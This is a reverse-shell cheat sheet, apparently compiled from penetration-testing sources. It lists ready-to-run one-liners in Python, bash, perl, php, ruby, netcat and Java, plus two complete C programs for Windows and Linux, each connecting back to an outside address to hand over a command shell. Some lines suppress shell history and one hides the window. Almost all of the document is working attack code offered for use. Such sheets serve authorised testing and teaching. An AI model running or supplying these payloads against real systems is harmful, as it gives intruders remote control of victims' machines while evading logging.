CREDITS:
https://github.com/infodox/python-pty-shells
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://github.com/loneicewolf/ReverseShells
-----------------------------------------------------------------------------------------------------------------------------

python UDP: python -c 'import socket, pty, os; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("10.10.16.21", 5151)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close()'

python TCP: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python SCTP: python -c 'import socket,pty,os;from sctp import *; s = sctpsocket_tcp(socket.AF_INET); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close()'

-----------------------------------------------------------------------------------------------------------------------------
bash TCP: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

bash UDP: bash -i >& /dev/udp/10.0.0.1/8080 0>&1

-----------------------------------------------------------------------------------------------------------------------------
perl TCP: perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

-----------------------------------------------------------------------------------------------------------------------------
php TCP: php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

-----------------------------------------------------------------------------------------------------------------------------
ruby TCP: ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

-----------------------------------------------------------------------------------------------------------------------------
netcat.traditional TCP: nc -e /bin/sh 10.0.0.1 1234
netcat.traditional UDP: nc -u -e /bin/sh 10.0.0.1 1234
netcat TCP: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
netcat UDP: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.0.0.1 1234 >/tmp/f

-----------------------------------------------------------------------------------------------------------------------------

Java TCP: r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()

-----------------------------------------------------------------------------------------------------------------------------
Java TCP 2: 

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-----------------------------------------------------------------------------------------------------------------------------
- C TCP Windows:
- compile on Linux: i686-w64-mingw32-gcc -o WIN_RSH.exe win_rsh.c -lws2_32

#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")
int main(int argc, char *argv[]){
WSADATA wsaData;
SOCKET sock;
struct sockaddr_in server;
STARTUPINFOA si = { 0 };
PROCESS_INFORMATION pi;
if (argc != 4){
printf("Usage: %s ipv4 port binary\n",argv[0]);
printf("\tExample 1:%s\v10.0.0.1 1234 cmd.exe\n",argv[0]);
return EXIT_FAILURE;
}
WSAStartup(MAKEWORD(1, 0), &wsaData);
sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
server.sin_family = AF_INET;
inet_pton(AF_INET, argv[1], &server.sin_addr.s_addr);
server.sin_port = htons(atoi(argv[2]));
WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL);
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
si.wShowWindow = SW_HIDE;
si.cb = sizeof(si);
CreateProcessA(NULL,argv[3],NULL,NULL,TRUE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
return EXIT_SUCCESS;
}



- C TCP Linux:
- compile on Linux: gcc -o LIN_RSH lin_rsh.c

#include <stdarg.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char **argv) {
int RP = 0; RP = atoi(argv[1]);
char *RH  = argv[2];
char *BIN = argv[3];
int is = 0; is = socket(AF_INET,SOCK_STREAM,0);
struct  sockaddr_in s1;
s1.sin_family      = AF_INET;
s1.sin_port        = htons(RP);
s1.sin_addr.s_addr = inet_addr(RH);
connect( is,(struct sockaddr *) &s1,sizeof(s1));
for(int i=0;i<3;dup2(is,i),i++);
char * const A[] = {BIN,NULL};
execve(BIN,  A, NULL);
return 0;
}
